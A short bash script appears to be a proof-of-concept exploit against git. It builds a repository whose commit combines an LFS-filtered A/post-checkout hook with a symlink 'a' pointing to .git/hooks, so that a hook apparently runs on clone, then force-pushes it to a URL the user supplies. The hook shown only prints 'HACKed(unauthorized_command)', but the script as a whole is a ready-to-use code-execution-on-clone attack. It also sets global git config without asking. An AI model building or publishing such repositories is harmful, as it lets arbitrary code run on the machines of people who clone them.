#!/bin/bash

git init
read -p "What is your git_config_name?: " _name
read -p "What is your git_config_email?: " _email
read -p "your github repsitory URL?: " _url

git config --global user.name "$_name"
git config --global user.email "$_email"
echo "A/post-checkout filter=lfs diff=lfs merge=lfs">.gitattributes &&
mkdir A &&
printf '#!/bin/sh\n\necho HACKed(unauthorized_command) >&2\n'>A/post-checkout &&
chmod +x A/post-checkout &&
>A/a &&
git add -A &&
rm -rf A &&
ln -s .git/hooks a &&
git add a &&
git commit -m initial

git branch -M main
git remote add origin $_url
git push -u -f origin main

echo "create the reposity"
